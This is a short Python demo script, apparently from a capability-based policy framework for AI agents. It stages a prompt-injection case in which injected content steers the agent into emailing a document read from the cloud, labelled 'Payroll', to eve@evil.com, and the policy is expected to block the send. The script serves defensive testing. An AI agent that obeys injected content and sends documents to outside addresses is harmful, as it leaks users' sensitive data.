from core.orchestrator import Orchestrator
from tools.read_cloud_doc import read_cloud_doc
from tools.send_email import send_email
from core.capabilities import Val, Capability

TOOLS = {"read_cloud_doc": read_cloud_doc, "send_email": send_email}

if __name__ == "__main__":
    orch = Orchestrator(TOOLS)
    doc = orch.call_tool("read_cloud_doc", doc_id="doc:malicious_notes")
    # Attacker coerces recipient via injected content, but we still enforce policy:
    to = Val(
        value="eve@evil.com",
        caps=Capability(provenance={"type": "User"}, readers="Public", tags=set()),
    )
    subject = Val(
        value="Payroll", caps=Capability(provenance={"type": "User"}, readers="Public", tags=set())
    )
    try:
        orch.call_tool("send_email", to=to, subject=subject, body=doc, attachment=doc)
    except PermissionError as e:
        print("BLOCKED:", e)
